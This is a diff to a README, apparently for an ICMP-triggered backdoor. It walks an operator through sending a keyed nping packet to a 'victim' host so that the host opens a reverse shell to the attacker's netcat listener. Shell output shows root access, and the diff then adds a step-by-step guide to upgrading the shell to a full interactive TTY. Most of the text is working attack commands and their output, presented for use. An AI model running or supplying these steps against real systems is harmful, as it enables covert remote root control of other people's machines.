@@ -24,5 +24,89 @@ $ nc -lnvp <port>
 ```
 And send an ICMP packet to the victim:
 ```
-$ nping --icmp -c 1 -dest-ip <victim-ip> --data-string 'wA@2mC!dq <attacker-ip> <port>'
+$ nping --icmp -c 1 -dest-ip <victim-ip> --data-string <secret-key> <attacker-ip> <port>'
 ```
+Now you have your shell!
+```
+$ nc -l -p 4096
+/bin/bash
+ls
+bin
+boot
+dev
+etc
+home
+keybase
+lib
+lib64
+lightdm
+lost+found
+media
+mnt
+nix
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+```
+
+# Adding TTY
+If you want to make your shell actually usable with TTY, here's my process. Or alternatively, check out [these](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) [guides](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) on upgrading your shell.
+
+First, on your host machine, ensure you're using bash:
+```
+$ bash
+$ 
+```
+Then initiate your reverse shell:
+```
+$ nc -l -p 4096
+/bin/bash
+ls
+bin
+boot
+dev
+etc
+...
+```
+Then use python to get a pseudo-terminal:
+```
+/bin/bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+[root@user /]#
+```
+From here exit out of the terminal and do:
+```
+/bin/bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+[root@user /]#
+Ctrl-Z
+$ stty raw -echo
+$ fg
+```
+From here your terminal will be pretty messed up:
+```
+nc -lvp 4096
+            [cursor somewhere here]
+```
+Reset the terminal via the command `reset`. You might not be able to press `enter` - if you can't, use `Ctrl-J` instead.
+```
+nc -lvp 4096
+            reset
+...
+[root@Synch /]#
+```
+From here, do all the basic terminal setting stuff:
+```
+[root@Synch /]# export SHELL=bash
+[root@Synch /]# export TERM=xterm-256color
+[root@Synch /]# stty rows <num> columns <cols>
+```
+Then you should be done! Vim/nano/etc should work decent from here.
